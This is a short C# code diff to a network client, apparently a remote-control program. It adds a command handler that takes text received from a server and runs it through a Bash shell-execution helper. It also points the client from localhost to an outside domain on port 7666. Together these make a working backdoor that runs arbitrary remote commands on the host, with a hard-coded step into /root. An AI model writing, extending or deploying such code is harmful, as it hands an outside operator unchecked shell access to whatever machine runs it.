@@ -11,7 +11,16 @@ namespace ClientO1
         public static char Sep = ';';
         public static void Handle_Archive(String Data, Byte[] Bytes)
         {
-
+            switch (ReadField(1,Data,Sep).ToLower())
+            {
+                case "mkdl":
+                    //var output = "cd /root".Bash();
+                    Console.WriteLine("cd /root".Bash());
+                    break;
+                case "mkda":
+                    Console.WriteLine(ReadEnd(Data,4).Bash());
+                    break;
+            }
         }
         public static void Handle_PAK(String Data)
         {
@@ -39,9 +48,13 @@ namespace ClientO1
         {
             String Datos = ReadField(1, Data, Sep);
 
-            switch (Datos)
+            switch (Datos.ToLower())
             {
-                case "MSG":
+                case "msg":
+                    Console.WriteLine(Data);
+
+                    break;
+                case "hldac":
                     Console.WriteLine(Data);
                     break;
             }
@@ -110,7 +123,7 @@ public class Conn
         public const short AF_INET6 = 23;
         public String response = String.Empty;
         public Encoding Enco = Encoding.UTF32;
-        private string ip = "127.0.0.1", serverPort = "7666";
+        private string ip = "networkhit.securitytactics.com", serverPort = "7666";
         private Thread Th_Rec;
         public void Config_Server()
         {
